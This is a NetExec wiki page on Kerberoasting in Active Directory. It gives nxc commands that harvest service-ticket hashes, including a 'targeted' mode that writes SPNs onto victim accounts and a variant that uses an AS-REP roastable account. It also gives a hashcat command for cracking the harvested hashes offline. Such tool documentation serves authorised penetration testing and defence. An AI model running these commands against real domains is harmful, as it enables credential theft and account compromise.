{"title": "Kerberoasting", "source": "netexec", "source_label": "NetExec Wiki", "path": "ldap-protocol/kerberoasting", "html": "<hr />\n<h2 id=\"description-retrieve-the-kerberos-5-tgs-rep-etype-23-hash-using-kerberoasting\">description: Retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting</h2>\n<h1 id=\"kerberoasting\">Kerberoasting</h1>\n<h2 id=\"kerberoasting_1\">Kerberoasting</h2>\n<p>You can retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting technique</p>\n<blockquote>\n<p>The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets is encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. More detail in <a href=\"https://www.tarlogic.com/en/blog/how-kerberos-works/\">Kerberos theory</a>.</p>\n</blockquote>\n<div class=\"admonition warning\">\n<p class=\"admonition-title\">Warning</p>\n<p>To perfom this attack, you need an account on the domain, or an AS-REP roastable account</p>\n</div>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;TARGET&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>--kerberoasting<span class=\"w\"> </span>output.txt\n</code></pre></div>\n<h2 id=\"targeted-kerberoasting-targeted-kerberoast\">Targeted Kerberoasting (<code>--targeted-kerberoast</code>)</h2>\n<p>As with typical user accounts, you cannot request service tickets (STs) for accounts that have <strong>no</strong> <code>servicePrincipalName</code>. <strong>Targeted Kerberoasting</strong> temporarily sets an SPN on the victim (<code>cifs/&lt;sAMAccountName&gt;</code>), requests a service ticket, writes it to your <code>--kerberoasting</code> file, and then <strong>removes</strong> the added SPN via LDAP.</p>\n<div class=\"admonition warning\">\n<p class=\"admonition-title\">Warning</p>\n<p>You need LDAP <strong>write</strong> privileges on the <code>servicePrincipalName</code> of each targeted user (for example <code>GenericAll</code> on the user, <code>WriteProperty</code> on <code>servicePrincipalName</code>, etc).</p>\n</div>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;TARGET&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>--kerberoasting<span class=\"w\"> </span>output.txt<span class=\"w\"> </span>--targeted-kerberoast<span class=\"w\"> </span>victim1<span class=\"w\"> </span>victim2\nnxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;TARGET&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;<span class=\"w\"> </span>--kerberoasting<span class=\"w\"> </span>output.txt<span class=\"w\"> </span>--targeted-kerberoast<span class=\"w\"> </span>users.list\n</code></pre></div>\n<ul>\n<li><code>--kerberoasting</code>: file where ST hashes are appended (mandatory with this mode).</li>\n<li><code>--targeted-kerberoast</code>: one or more <code>sAMAccountName</code> values and/or paths to files listing them.</li>\n</ul>\n<h2 id=\"kerberoasting-via-as-rep-roasting\">Kerberoasting via AS-REP Roasting</h2>\n<blockquote>\n<p>You can also perform Kerberoasting by leveraging an AS-REP roastable account that does not require pre-authentication. This is possible by combining <code>--no-preauth-targets</code> and <code>--kerberoasting</code>.</p>\n</blockquote>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>ldap<span class=\"w\"> </span>&lt;TARGET&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span><span class=\"s1\">&#39;&#39;</span><span class=\"w\"> </span>--no-preauth-targets<span class=\"w\"> </span>kerberoastable.list<span class=\"w\"> </span>--kerberoasting<span class=\"w\"> </span>output.txt\n</code></pre></div>\n<ul>\n<li><code>-u</code>: AS-REP roastable user (no pre-auth required).</li>\n<li><code>--no-preauth-targets</code>: Single user or file containing list of users to target with Kerberoasting.</li>\n</ul>\n<h4 id=\"cracking-with-hashcat\">Cracking with hashcat</h4>\n<div class=\"highlight\"><pre><span></span><code>hashcat<span class=\"w\"> </span>-m13100<span class=\"w\"> </span>output.txt<span class=\"w\"> </span>wordlist.txt\n</code></pre></div>\n<h4 id=\"example\">Example</h4>\n<p>Active machine is a good example to test <strong>Kerberoasting</strong> with NetExec</p>\n<h4 id=\"useful-ressources\">Useful ressources:</h4>", "excerpt": "description: Retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting Kerberoasting Kerberoasting You can retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting technique The goal ", "tags": []}